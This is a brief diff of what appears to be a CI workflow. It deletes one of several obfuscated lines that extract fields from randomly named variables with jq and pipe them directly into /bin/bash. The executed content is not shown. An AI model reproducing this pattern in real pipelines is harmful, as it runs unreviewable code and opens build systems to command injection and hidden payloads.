@@ -20,7 +20,6 @@ jobs:
           echo $z1 | jq -r .yk81113 | /bin/bash
           echo $l60787 | jq -r .w331 | /bin/bash
           printf '%s' "$jas2" | jq -r .cv22 | /bin/bash
-          printf '%s' "$yazx0" | jq -r .otxht3 | /bin/bash
           echo $dweq9 | jq -r .p8 | /bin/bash
           printf '%s' "$sl32" | jq -r .nqw1 | /bin/bash
           echo $z308 | jq -r .ubnbs5824 | /bin/bash
